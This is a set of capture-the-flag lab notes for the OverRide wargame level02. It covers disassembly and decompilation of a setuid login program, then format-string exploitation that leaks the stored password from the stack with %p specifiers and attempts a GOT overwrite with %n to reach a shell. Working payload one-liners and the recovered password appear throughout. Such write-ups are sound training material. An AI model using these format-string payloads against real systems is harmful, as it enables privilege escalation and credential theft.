level02@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02


(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400640  _init
0x0000000000400670  strncmp
0x0000000000400670  strncmp@plt
0x0000000000400680  puts
0x0000000000400680  puts@plt
0x0000000000400690  fread
0x0000000000400690  fread@plt
0x00000000004006a0  fclose
0x00000000004006a0  fclose@plt
0x00000000004006b0  system
0x00000000004006b0  system@plt
0x00000000004006c0  printf
0x00000000004006c0  printf@plt
0x00000000004006d0  strcspn
0x00000000004006d0  strcspn@plt
0x00000000004006e0  __libc_start_main
0x00000000004006e0  __libc_start_main@plt
0x00000000004006f0  fgets
0x00000000004006f0  fgets@plt
0x0000000000400700  fopen
0x0000000000400700  fopen@plt
0x0000000000400710  exit
0x0000000000400710  exit@plt
0x0000000000400720  fwrite
0x0000000000400720  fwrite@plt
0x0000000000400730  _start
0x000000000040075c  call_gmon_start
0x0000000000400780  __do_global_dtors_aux
0x00000000004007f0  frame_dummy
0x0000000000400814  main
0x0000000000400ac0  __libc_csu_init
0x0000000000400b50  __libc_csu_fini
0x0000000000400b60  __do_global_ctors_aux
0x0000000000400b98  _fini

(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400814 <+0>:	push   %rbp
   0x0000000000400815 <+1>:	mov    %rsp,%rbp
   0x0000000000400818 <+4>:	sub    $0x120,%rsp
   0x000000000040081f <+11>:	mov    %edi,-0x114(%rbp)
   0x0000000000400825 <+17>:	mov    %rsi,-0x120(%rbp)
   0x000000000040082c <+24>:	lea    -0x70(%rbp),%rdx
   0x0000000000400830 <+28>:	mov    $0x0,%eax
   0x0000000000400835 <+33>:	mov    $0xc,%ecx
   0x000000000040083a <+38>:	mov    %rdx,%rdi
   0x000000000040083d <+41>:	rep stos %rax,%es:(%rdi)
   0x0000000000400840 <+44>:	mov    %rdi,%rdx
   0x0000000000400843 <+47>:	mov    %eax,(%rdx)
   0x0000000000400845 <+49>:	add    $0x4,%rdx
   0x0000000000400849 <+53>:	lea    -0xa0(%rbp),%rdx
   0x0000000000400850 <+60>:	mov    $0x0,%eax
   0x0000000000400855 <+65>:	mov    $0x5,%ecx
   0x000000000040085a <+70>:	mov    %rdx,%rdi
   0x000000000040085d <+73>:	rep stos %rax,%es:(%rdi)
   0x0000000000400860 <+76>:	mov    %rdi,%rdx
   0x0000000000400863 <+79>:	mov    %al,(%rdx)
   0x0000000000400865 <+81>:	add    $0x1,%rdx
   0x0000000000400869 <+85>:	lea    -0x110(%rbp),%rdx
   0x0000000000400870 <+92>:	mov    $0x0,%eax
   0x0000000000400875 <+97>:	mov    $0xc,%ecx
   0x000000000040087a <+102>:	mov    %rdx,%rdi
   0x000000000040087d <+105>:	rep stos %rax,%es:(%rdi)
   0x0000000000400880 <+108>:	mov    %rdi,%rdx
   0x0000000000400883 <+111>:	mov    %eax,(%rdx)
   0x0000000000400885 <+113>:	add    $0x4,%rdx
   0x0000000000400889 <+117>:	movq   $0x0,-0x8(%rbp)
   0x0000000000400891 <+125>:	movl   $0x0,-0xc(%rbp)
   0x0000000000400898 <+132>:	mov    $0x400bb0,%edx
   0x000000000040089d <+137>:	mov    $0x400bb2,%eax
   0x00000000004008a2 <+142>:	mov    %rdx,%rsi
   0x00000000004008a5 <+145>:	mov    %rax,%rdi
   0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt>
   0x00000000004008ad <+153>:	mov    %rax,-0x8(%rbp)
   0x00000000004008b1 <+157>:	cmpq   $0x0,-0x8(%rbp)
   0x00000000004008b6 <+162>:	jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>:	mov    0x200991(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x00000000004008bf <+171>:	mov    %rax,%rdx
   0x00000000004008c2 <+174>:	mov    $0x400bd0,%eax
   0x00000000004008c7 <+179>:	mov    %rdx,%rcx
   0x00000000004008ca <+182>:	mov    $0x24,%edx
   0x00000000004008cf <+187>:	mov    $0x1,%esi
   0x00000000004008d4 <+192>:	mov    %rax,%rdi
   0x00000000004008d7 <+195>:	callq  0x400720 <fwrite@plt>
   0x00000000004008dc <+200>:	mov    $0x1,%edi
   0x00000000004008e1 <+205>:	callq  0x400710 <exit@plt>
   0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax
   0x00000000004008ed <+217>:	mov    -0x8(%rbp),%rdx
   0x00000000004008f1 <+221>:	mov    %rdx,%rcx
   0x00000000004008f4 <+224>:	mov    $0x29,%edx
   0x00000000004008f9 <+229>:	mov    $0x1,%esi
   0x00000000004008fe <+234>:	mov    %rax,%rdi
   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt>
   0x0000000000400906 <+242>:	mov    %eax,-0xc(%rbp)
   0x0000000000400909 <+245>:	lea    -0xa0(%rbp),%rax
   0x0000000000400910 <+252>:	mov    $0x400bf5,%esi
   0x0000000000400915 <+257>:	mov    %rax,%rdi
   0x0000000000400918 <+260>:	callq  0x4006d0 <strcspn@plt>
   0x000000000040091d <+265>:	movb   $0x0,-0xa0(%rbp,%rax,1)
   0x0000000000400925 <+273>:	cmpl   $0x29,-0xc(%rbp)
   0x0000000000400929 <+277>:	je     0x40097d <main+361>
   0x000000000040092b <+279>:	mov    0x20091e(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400932 <+286>:	mov    %rax,%rdx
   0x0000000000400935 <+289>:	mov    $0x400bf8,%eax
   0x000000000040093a <+294>:	mov    %rdx,%rcx
   0x000000000040093d <+297>:	mov    $0x24,%edx
   0x0000000000400942 <+302>:	mov    $0x1,%esi
   0x0000000000400947 <+307>:	mov    %rax,%rdi
   0x000000000040094a <+310>:	callq  0x400720 <fwrite@plt>
   0x000000000040094f <+315>:	mov    0x2008fa(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400956 <+322>:	mov    %rax,%rdx
   0x0000000000400959 <+325>:	mov    $0x400bf8,%eax
   0x000000000040095e <+330>:	mov    %rdx,%rcx
   0x0000000000400961 <+333>:	mov    $0x24,%edx
   0x0000000000400966 <+338>:	mov    $0x1,%esi
   0x000000000040096b <+343>:	mov    %rax,%rdi
   0x000000000040096e <+346>:	callq  0x400720 <fwrite@plt>
   0x0000000000400973 <+351>:	mov    $0x1,%edi
   0x0000000000400978 <+356>:	callq  0x400710 <exit@plt>
   0x000000000040097d <+361>:	mov    -0x8(%rbp),%rax
   0x0000000000400981 <+365>:	mov    %rax,%rdi
   0x0000000000400984 <+368>:	callq  0x4006a0 <fclose@plt>
   0x0000000000400989 <+373>:	mov    $0x400c20,%edi
   0x000000000040098e <+378>:	callq  0x400680 <puts@plt>
   0x0000000000400993 <+383>:	mov    $0x400c50,%edi
   0x0000000000400998 <+388>:	callq  0x400680 <puts@plt>
   0x000000000040099d <+393>:	mov    $0x400c80,%edi
   0x00000000004009a2 <+398>:	callq  0x400680 <puts@plt>
   0x00000000004009a7 <+403>:	mov    $0x400cb0,%edi
   0x00000000004009ac <+408>:	callq  0x400680 <puts@plt>
   0x00000000004009b1 <+413>:	mov    $0x400cd9,%eax
   0x00000000004009b6 <+418>:	mov    %rax,%rdi
   0x00000000004009b9 <+421>:	mov    $0x0,%eax
   0x00000000004009be <+426>:	callq  0x4006c0 <printf@plt>
   0x00000000004009c3 <+431>:	mov    0x20087e(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:	mov    %rax,%rdx
   0x00000000004009cd <+441>:	lea    -0x70(%rbp),%rax
   0x00000000004009d1 <+445>:	mov    $0x64,%esi
   0x00000000004009d6 <+450>:	mov    %rax,%rdi
   0x00000000004009d9 <+453>:	callq  0x4006f0 <fgets@plt>
   0x00000000004009de <+458>:	lea    -0x70(%rbp),%rax
   0x00000000004009e2 <+462>:	mov    $0x400bf5,%esi
   0x00000000004009e7 <+467>:	mov    %rax,%rdi
   0x00000000004009ea <+470>:	callq  0x4006d0 <strcspn@plt>
   0x00000000004009ef <+475>:	movb   $0x0,-0x70(%rbp,%rax,1)
   0x00000000004009f4 <+480>:	mov    $0x400ce8,%eax
   0x00000000004009f9 <+485>:	mov    %rax,%rdi
   0x00000000004009fc <+488>:	mov    $0x0,%eax
   0x0000000000400a01 <+493>:	callq  0x4006c0 <printf@plt>
   0x0000000000400a06 <+498>:	mov    0x20083b(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>:	mov    %rax,%rdx
   0x0000000000400a10 <+508>:	lea    -0x110(%rbp),%rax
   0x0000000000400a17 <+515>:	mov    $0x64,%esi
   0x0000000000400a1c <+520>:	mov    %rax,%rdi
   0x0000000000400a1f <+523>:	callq  0x4006f0 <fgets@plt>
   0x0000000000400a24 <+528>:	lea    -0x110(%rbp),%rax
   0x0000000000400a2b <+535>:	mov    $0x400bf5,%esi
   0x0000000000400a30 <+540>:	mov    %rax,%rdi
   0x0000000000400a33 <+543>:	callq  0x4006d0 <strcspn@plt>
   0x0000000000400a38 <+548>:	movb   $0x0,-0x110(%rbp,%rax,1)
   0x0000000000400a40 <+556>:	mov    $0x400cf8,%edi
   0x0000000000400a45 <+561>:	callq  0x400680 <puts@plt>
   0x0000000000400a4a <+566>:	lea    -0x110(%rbp),%rcx
   0x0000000000400a51 <+573>:	lea    -0xa0(%rbp),%rax
   0x0000000000400a58 <+580>:	mov    $0x29,%edx
   0x0000000000400a5d <+585>:	mov    %rcx,%rsi
   0x0000000000400a60 <+588>:	mov    %rax,%rdi
   0x0000000000400a63 <+591>:	callq  0x400670 <strncmp@plt>
   0x0000000000400a68 <+596>:	test   %eax,%eax
   0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>
   0x0000000000400a6c <+600>:	mov    $0x400d22,%eax
   0x0000000000400a71 <+605>:	lea    -0x70(%rbp),%rdx
   0x0000000000400a75 <+609>:	mov    %rdx,%rsi
   0x0000000000400a78 <+612>:	mov    %rax,%rdi
   0x0000000000400a7b <+615>:	mov    $0x0,%eax
   0x0000000000400a80 <+620>:	callq  0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:	mov    $0x0,%eax
   0x0000000000400a94 <+640>:	leaveq 
   0x0000000000400a95 <+641>:	retq   
   0x0000000000400a96 <+642>:	lea    -0x70(%rbp),%rax
   0x0000000000400a9a <+646>:	mov    %rax,%rdi
   0x0000000000400a9d <+649>:	mov    $0x0,%eax
   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
   0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>
   0x0000000000400ab1 <+669>:	mov    $0x1,%edi
   0x0000000000400ab6 <+674>:	callq  0x400710 <exit@plt>
End of assembler dump.


undefined8 main(void)

{
  int iVar1;
  size_t sVar2;
  long lVar3;
  char *pcVar4;
  char local_118 [112];
  char local_a8 [48];
  char local_78 [100];
  int local_14;
  FILE *local_10;
  
  pcVar4 = local_78;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    pcVar4[0] = '\0';
    pcVar4[1] = '\0';
    pcVar4[2] = '\0';
    pcVar4[3] = '\0';
    pcVar4[4] = '\0';
    pcVar4[5] = '\0';
    pcVar4[6] = '\0';
    pcVar4[7] = '\0';
    pcVar4 = pcVar4 + 8;
  }
  pcVar4[0] = '\0';
  pcVar4[1] = '\0';
  pcVar4[2] = '\0';
  pcVar4[3] = '\0';
  pcVar4 = local_a8;
  for (lVar3 = 5; lVar3 != 0; lVar3 = lVar3 + -1) {
    pcVar4[0] = '\0';
    pcVar4[1] = '\0';
    pcVar4[2] = '\0';
    pcVar4[3] = '\0';
    pcVar4[4] = '\0';
    pcVar4[5] = '\0';
    pcVar4[6] = '\0';
    pcVar4[7] = '\0';
    pcVar4 = pcVar4 + 8;
  }
  *pcVar4 = '\0';
  pcVar4 = local_118;
  for (lVar3 = 0xc; lVar3 != 0; lVar3 = lVar3 + -1) {
    pcVar4[0] = '\0';
    pcVar4[1] = '\0';
    pcVar4[2] = '\0';
    pcVar4[3] = '\0';
    pcVar4[4] = '\0';
    pcVar4[5] = '\0';
    pcVar4[6] = '\0';
    pcVar4[7] = '\0';
    pcVar4 = pcVar4 + 8;
  }
  pcVar4[0] = '\0';
  pcVar4[1] = '\0';
  pcVar4[2] = '\0';
  pcVar4[3] = '\0';
  local_10 = (FILE *)0x0;
  local_14 = 0;
  local_10 = fopen("/home/users/level03/.pass","r");
  if (local_10 == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar2 = fread(local_a8,1,0x29,local_10);
  local_14 = (int)sVar2;
  sVar2 = strcspn(local_a8,"\n");
  local_a8[sVar2] = '\0';
  if (local_14 != 0x29) {
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
    fwrite("ERROR: failed to read password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fclose(local_10);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets(local_78,100,stdin);
  sVar2 = strcspn(local_78,"\n");
  local_78[sVar2] = '\0';
  printf("--[ Password: ");
  fgets(local_118,100,stdin);
  sVar2 = strcspn(local_118,"\n");
  local_118[sVar2] = '\0';
  puts("*****************************************");
  iVar1 = strncmp(local_a8,local_118,0x29);
  if (iVar1 == 0) {
    printf("Greetings, %s!\n",local_78);
    system("/bin/sh");
    return 0;
  }
  printf(local_78);
  puts(" does not have access!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}


level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: test
--[ Password: abc
*****************************************
test does not have access!

_________


  printf(local_78);

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: b
*****************************************
aaaa ffffe500 0 62 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 62 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d feff00 61616161 does not have access!


%28\$n

[address to update] [padding] %28\$n
└────────┬────────┘ └───┬───┘ 
		 4				?		
└─────────────┬─────────────┘
			  ??

? = ?? - 4

?? = set address to update


puts GOT -> system call  ?


(gdb) p puts
$2 = {<text variable, no debug info>} 0x400680 <puts@plt>
(gdb) p system
$3 = {<text variable, no debug info>} 0x4006b0 <system@plt>
(gdb) p exit
$4 = {<text variable, no debug info>} 0x400710 <exit@plt>


0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>


0x400680 -> 0x0000000000400a8a

0x0000000000400a8a -> 4197002

4197002 - 4 = 4196998

? = 4196998
?? = 4197002


0x400680 -> \x80\x06\x40\x00

python -c "'\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" 

python -c "'\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" | ./level02

NOPE

python -c "print '\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" 

python -c "print '\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" | ./level02

level02@OverRide:~$ python -c "print '\x80\x06\x40\x00' + '%4196998x' + '%28\$n'" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
�@ does not have access!



0x400710 -> \x10\x07\x40\x00

python -c "print '\x10\x07\x40\x00' + '%4196998x' + '%28\$n'" 

python -c "print '\x10\x07\x40\x00' + '%4196998x' + '%28\$n'" | ./level02

NOPE

  0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>

0x400d3a -> anything => check si peut modifier value avec %x + %\$n

0x400d3a -> \x3a\x0d\x40\x00

python -c "print '\x3a\x0d\x40\x00' + '%28\$n'" 

python -c "print '\x3a\x0d\x40\x00' + '%28\$n'" | ./level02

NOPE


__________________________________

   0x0000000000400a51 <+573>:	lea    -0xa0(%rbp),%rax
   0x0000000000400a58 <+580>:	mov    $0x29,%edx
   0x0000000000400a5d <+585>:	mov    %rcx,%rsi
   0x0000000000400a60 <+588>:	mov    %rax,%rdi
   0x0000000000400a63 <+591>:	callq  0x400670 <strncmp@plt>

-0xa0(%rbp) -> rax -> rdi
strncmp(rdi, rsi, edx) -> strncmp(local_a8,local_118,0x29);
fread(local_a8,1,0x29,local_10); WHERE local_10 = fopen("/home/users/level03/.pass","r");

Donc print local_a8 = print pass

   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
   0x0000000000400aa7 <+659>:	mov    $0x400d3a,%edi
   0x0000000000400aac <+664>:	callq  0x400680 <puts@plt>

   print that overwrite, only this possible to overwrite is puts().

$0x400d3a,%edi
ovewrite $0x400d3a : $0x400d3a -> edi -> puts

overwrite edi : $0x400d3a -> edi -> overwrite edi -> puts




python -c "print '\x3a\x0d\x40\x00' + '%28\$n'" | ./level02

NOPE

_____________________


Format String **READ**

  0x0000000000400a51 <+573>:	lea    -0xa0(%rbp),%rax
   0x0000000000400a58 <+580>:	mov    $0x29,%edx
   0x0000000000400a5d <+585>:	mov    %rcx,%rsi
   0x0000000000400a60 <+588>:	mov    %rax,%rdi
   0x0000000000400a63 <+591>:	callq  0x400670 <strncmp@plt>

-0xa0(%rbp) -> rax -> rdi
strncmp(rdi, rsi, edx) -> strncmp(local_a8,local_118,0x29);
fread(local_a8,1,0x29,local_10); WHERE local_10 = fopen("/home/users/level03/.pass","r");

Donc read via %p local_a8 = print pass

0xa0

   0x0000000000400a96 <+642>:	lea    -0x70(%rbp),%rax
   0x0000000000400a9a <+646>:	mov    %rax,%rdi
   0x0000000000400a9d <+649>:	mov    $0x0,%eax
   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>


-0x70(%rbp) -> rax -> rdi
  printf(rdi); ->   printf(local_78);


Ce qu'on print est a : 0x70

----

rpb

0x70 - rbp-112

[48]

0xa0 - rbp-160


local_78 -> 28 element dans la stack

chaque element = 8 bytes

48 / 8 = 6 => 6 elements decart.


28 - 6 = 22

rpb

0x70 - rbp-112 - element 22

[48 - 6 element]

0xa0 - rbp-160 - element 28


pass = 40 bytes = 5 element

=> print 5 elements de 22 a 27.



%22$p.%23$p.%24$p.%25$p.%26$p.%27$p

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p.%23$p.%24$p.%25$p.%26$p.%27$p
--[ Password: password
*****************************************
0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00 does not have access!

(python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p.%27\$p'"; sleep 1; echo "password") | ./level02

level02@OverRide:~$ (python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p.%27\$p'"; sleep 1; echo "password") | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00 does not have access!


0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.0xfeff00

sans point ----

[...]

0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d0xfeff00

__________________________________


Clean:

%22$p%23$p%24$p%25$p%26$p

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password: password
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!

---

level02@OverRide:~$ (python -c "print '%22\$p%23\$p%24\$p%25\$p%26\$p'"; sleep 1; echo "password") | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!

0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d

---

aoberon@f4r7s16 ~/4/E/O/l/Ressources (master)> python3 decrypt.py 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H



level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: a
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, a!
$ id
uid=1002(level02) gid=1002(level02) euid=1003(level03) egid=100(users) groups=1003(level03),100(users),1002(level02)
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
$ exit


______________________________________________________________-



(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
   0x0000000000400716 <+6>:	pushq  $0xa
   0x000000000040071b <+11>:	jmpq   0x400660
End of assembler dump.


0x0000000000400a85 <+625>:	mov    $0x400d32,%edi
   0x0000000000400a8a <+630>:	callq  0x4006b0 <system@plt>


%28\$n

[address to update] [padding] %28\$n
└────────┬────────┘ └───┬───┘ 
		 4				?		
└─────────────┬─────────────┘
			  ??

? = ?? - 4

?? = set address to update


exit GOT -> system call  ?


0x601228 -> 0x0000000000400a85

\x28\x12\x60 -> 4196997


\x28\x12\x60 %4196997x %28\$n

(python "print '\x28\x12\x60' + '%4196997x' + '%28\$n'") | ./level02	-> fonctionne pas

(python -c 'print "%4196997d" + "%8$n"' ; python -c 'print "\x28\x12\x60"'; cat) | ./level02	-> fonctionne

(python -c "print '%4196997d' + '%8$n'" ; python -c "print '\x28\x12\x60'"; cat) | ./level02	-> fonctionne pas
